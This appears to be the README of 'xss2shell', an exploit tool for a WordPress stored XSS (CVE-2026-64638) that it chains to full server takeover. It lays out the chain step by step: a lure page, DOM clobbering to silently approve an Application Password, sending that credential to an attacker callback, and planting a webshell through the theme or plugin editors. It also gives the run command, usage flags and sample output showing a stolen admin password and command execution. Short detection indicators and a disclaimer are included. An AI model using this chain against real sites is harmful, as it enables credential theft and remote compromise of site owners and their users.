<div align="center">

```
 __  __ ___ ___ ___ ___ _  _  ___ _    _    
 \ \/ // __/ __| _ \ __| || |/ __| |  | |   
  >  < \__ \__ \  _/ _|| __ | (__| |__| |__ 
 /_/\_\|___/___/_| |___|_||_|\___|____|____|
                                     v1.0
```

# xss2shell

### WordPress Pre-Auth Stored XSS to Remote Code Execution

**CVE-2026-64638** | WordPress < 7.0.3 | Zero-Click Admin Takeover

[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://python.org)
[![CVE](https://img.shields.io/badge/CVE--2026--64638-critical-red.svg)](https://nvd.nist.gov/vuln/detail/CVE-2026-64638)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

**One XSS. Full RCE. No authentication required.**

Every public PoC for this CVE is broken. This one works.

---

</div>

## The Bug

WordPress < 7.0.3 reflects the `log` (username) parameter in `wp-login.php` without sanitization. The value is stored and rendered in the admin's authenticated context — turning a login form into a persistent XSS entry point that requires **zero authentication**.

## The Chain

```
Victim visits attacker link
        |
        v
Stored XSS fires in wp-login.php
        |
        v
Application Password silently stolen
        |
        v
Webshell written via theme/plugin editor
        |
        v
Remote Code Execution
```

**4 steps. 1 click. Full server compromise.**

| Step | What Happens | How |
|------|-------------|-----|
| 1 | XSS triggers | Malformed `log` param stored + reflected in admin session |
| 2 | Credentials stolen | `authorize-application.php` auto-approves via JSONP + DOM clobbering |
| 3 | Shell planted | 3 fallback methods: theme editor → plugin upload → plugin editor |
| 4 | RCE confirmed | `shell_exec()` via webshell, output returned as JSON |

## Quick Start

```bash
# No dependencies. Pure Python 3. Just run it.
python xss2shell.py -t http://target.com -c "id"
```

The tool starts a local HTTP server and generates a lure URL. When the WordPress admin visits it:

```
[+] Admin panel found: http://target.com/wp-login.php
[+] Attacker server listening: 192.168.1.5:8443
[*] Waiting for the admin to visit ...
[+] Victim opened the attacker page
[+] XSS payload POSTed to wp-login.php
[+] Application Password stolen: user=admin pass=XXXX XXXX XXXX
[+] Theme editor: webshell injected into functions.php
[+] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Usage

```
usage: xss2shell.py [-h] -t TARGET -c COMMAND [--lhost LHOST] [--lport LPORT] [--keep]

  -t, --target   Target WordPress URL (e.g. http://wordpress.local)
  -c, --command   OS command to execute (e.g. "id", "whoami", "cat /etc/passwd")
  --lhost         Attacker IP (default: auto-detect)
  --lport         Attacker port (default: random)
  --keep          Don't clean up artifacts after exploitation
```

## Why This Exists

Every public PoC for CVE-2026-64638 either:
- Only demonstrates the XSS (alert box — useless)
- Fails to chain to any real impact
- Breaks on default WordPress configurations
- Requires manual steps a triager can't reproduce

This tool delivers **end-to-end exploitation** — from zero auth to RCE — in a single command. Built for researchers who need a working PoC, not a theoretical write-up.

## How It Works

**Stage 1 — Lure & XSS**

The attacker hosts a page that opens a popup to `wp-login.php` with a crafted `log` parameter containing HTML injection. The payload uses DOM clobbering (`<area id=ajaxurl>`) to hijack WordPress's AJAX URL resolution, redirecting a JSONP callback to trigger the Application Password approval button via `window.opener`.

**Stage 2 — Credential Theft**

The parent window navigates to `authorize-application.php` with a pre-registered `app_id` and `success_url` pointing back to the attacker. When the XSS-triggered JSONP fires `window.opener.approve.click`, the Application Password is created and sent to the attacker's callback.

**Stage 3 — Shell Deployment (3 fallback methods)**

| Priority | Method | Endpoint |
|----------|--------|----------|
| 1 | Theme File Editor | `theme-editor.php` — inject into `functions.php` |
| 2 | Plugin ZIP Upload | `update.php?action=upload-plugin` — upload webshell as plugin |
| 3 | Plugin File Editor | `plugin-editor.php` — inject into existing plugin file |

Each method extracts CSRF nonces from the admin panel and writes PHP code that executes OS commands.

**Stage 4 — RCE**

The webshell responds to HTTP requests with JSON containing command output. The tool verifies RCE, executes the user's command, and optionally cleans up all artifacts.

## Affected Versions

| Version | Status |
|---------|--------|
| WordPress < 7.0.3 | Vulnerable |
| WordPress >= 7.0.3 | Patched |

## Detection

Indicators of compromise if xss2shell was used against your site:

- Application Password created for app name `XSS2Shell-Poc-Wordsec`
- Plugin `xss2shell` installed in `wp-content/plugins/`
- Modified `functions.php` containing `xss2shell_cmd`
- Unusual JSONP requests to `/?rest_route=/&_method=GET&_jsonp=`

## Limitations

| Condition | Effect |
|-----------|--------|
| `DISALLOW_FILE_EDIT = true` | Theme/plugin editors disabled — only ZIP upload works |
| `DISALLOW_FILE_MODS = true` | All 3 methods blocked — no RCE |
| WAF (Cloudflare, Wordfence) | May filter XSS payload or shell requests |
| `disable_functions` in PHP | `shell_exec` blocked — webshell returns empty output |
| Pop-up blocker | Popup chain breaks — requires user to allow popups |
| CSP headers | May block inline scripts or cross-origin requests |

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Use it only against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse.

## Credits

- **Author**: [WordSec](https://wordsec.net/)
- **CVE**: CVE-2026-64638
- **Patched in**: WordPress 7.0.3

---

<div align="center">

**If this helped your research, drop a star.**

</div>
